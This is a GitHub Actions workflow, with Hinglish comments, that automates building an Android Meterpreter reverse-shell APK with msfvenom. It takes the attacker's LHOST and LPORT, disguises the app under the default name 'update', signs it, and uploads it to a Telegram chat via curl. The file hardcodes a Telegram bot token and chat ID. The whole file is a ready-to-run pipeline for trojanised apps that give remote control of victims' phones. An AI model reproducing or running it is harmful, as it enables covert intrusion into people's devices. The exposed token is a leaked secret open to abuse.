name: Build Android Payload

on:
  workflow_dispatch:
    inputs:
      lhost:
        description: "LHOST - public IP / DDNS (ngrok bhi chalega)"
        required: true
      lport:
        description: "LPORT"
        required: true
        default: "4444"
      payload:
        description: "Payload type"
        type: choice
        required: true
        default: "android/meterpreter/reverse_https"
        options:
          - android/meterpreter/reverse_https
          - android/meterpreter/reverse_tcp
      app_name:
        description: "APK ka naam"
        required: false
        default: "update"

# ====== YAHAN PASTE KARO ======
env:
  BOT_TOKEN: "7867132649:AAFvLV9LpNE8Jiv5blMhdbMsacqLijDdh0o"
  CHAT_ID: "6522295816"
# ==============================

concurrency:
  group: payload-${{ github.ref }}
  cancel-in-progress: true

jobs:
  build:
    runs-on: ubuntu-22.04
    timeout-minutes: 30
    env:
      LHOST: ${{ inputs.lhost }}
      LPORT: ${{ inputs.lport }}
      PAYLOAD: ${{ inputs.payload }}
      APK_NAME: ${{ inputs.app_name }}

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Pull Metasploit image
        run: |
          docker pull metasploitframework/metasploit-framework:latest
          docker run --rm --entrypoint ./msfvenom \
            metasploitframework/metasploit-framework:latest --version

      - name: Generate APK
        run: |
          set -euo pipefail
          docker run --rm \
            --entrypoint ./msfvenom \
            -v "$PWD:/data" \
            -w /data \
            metasploitframework/metasploit-framework:latest \
            -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" \
            -a dalvik --platform android \
            -o "/data/raw-${APK_NAME}.apk"
          sudo chown "$(id -u):$(id -g)" raw-*.apk
          ls -lh raw-*.apk

      - name: Zipalign + Sign
        run: |
          set -euo pipefail
          BT=$(ls -d "$ANDROID_HOME"/build-tools/* | sort -V | tail -1)
          echo "build-tools: $BT"

          keytool -genkeypair -v -keystore debug.keystore \
            -storepass android -keypass android \
            -alias androiddebugkey -keyalg RSA -keysize 2048 \
            -validity 10000 -dname "CN=Android Debug,O=Android,C=US"

          "$BT/zipalign" -p -f 4 "raw-${APK_NAME}.apk" "aligned.apk"

          "$BT/apksigner" sign \
            --ks debug.keystore --ks-pass pass:android \
            --key-pass pass:android --ks-key-alias androiddebugkey \
            --out "${APK_NAME}.apk" aligned.apk

          "$BT/apksigner" verify "${APK_NAME}.apk"
          ls -lh "${APK_NAME}.apk"

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: payload-apk
          path: ${{ inputs.app_name }}.apk
          retention-days: 7

      - name: Send to Telegram
        if: always()
        run: |
          set -euo pipefail
          APK="${APK_NAME}.apk"
          [ -f "$APK" ] || { echo "APK missing"; exit 1; }

          SIZE=$(stat -c%s "$APK")
          echo "size: $SIZE bytes"
          if [ "$SIZE" -gt 52428800 ]; then
            echo "::error::APK 50MB se bada hai, Telegram bot limit cross."
            exit 1
          fi

          CAP="APK ready%0APayload: ${PAYLOAD}%0ALHOST: ${LHOST}:${LPORT}%0ABuild: ${GITHUB_RUN_NUMBER}"

          RESP=$(curl -sS --max-time 180 -X POST \
            "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument" \
            -F "chat_id=${CHAT_ID}" \
            -F "document=@${APK}" \
            -F "caption=${CAP}")

          echo "$RESP"
          echo "$RESP" | grep -q '"ok":true' || { echo "::error::Telegram send fail"; exit 1; }

      - name: Summary
        if: always()
        run: |
          {
            echo "### Payload build"
            echo "| field | value |"
            echo "|---|---|"
            echo "| payload | ${PAYLOAD} |"
            echo "| lhost | ${LHOST} |"
            echo "| lport | ${LPORT} |"
            echo "| run | ${GITHUB_RUN_NUMBER} |"
          } >> "$GITHUB_STEP_SUMMARY"
